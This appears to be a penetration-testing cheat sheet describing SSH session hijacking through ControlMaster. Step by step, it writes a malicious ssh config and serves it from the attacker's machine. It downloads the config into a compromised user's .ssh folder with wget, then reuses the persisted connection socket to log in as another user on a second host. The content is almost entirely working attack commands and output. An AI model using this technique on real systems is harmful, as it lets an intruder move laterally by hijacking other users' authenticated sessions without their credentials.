# SSH Hijacking with Controlmaster


1. Create the config file.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ cat config      
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist yes

```

2. Start a SimpleHTTPServer with python, using a common ports.

```bash
┌──(v0lk3n㉿K4l1-L1nux)-[~]
└─$ python -m SimpleHTTPServer 443                             
Serving HTTP on 0.0.0.0 port 443 ...

```

3. Download the config file into the target .ssh folder and give it the required permissions.

```bash
target@sinhack2:/home/aerith/.ssh$ wget http://192.168.x.x:443/config

target@sinhack2:/home/aerith/.ssh$ chmod 644 config

```

4. Wait a moment and we should see ssh connection inside the controlmaster folder.

```bash
target@sinhack2:/home/aerith/.ssh/controlmaster$ ls
ls
cloud@sinhack3:22
```

5. Now ssh as cloud on sinhack3.

```bash
target@sinhack2:/home/aerith/.ssh/controlmaster$ ssh cloud@sinhack3
ssh cloud@sinhack3
Last login: Tue Sep 15 17:30:37 2020 from 192.168.118.3
cloud@sinhack3:~$ whoami
whoami
cloud

```
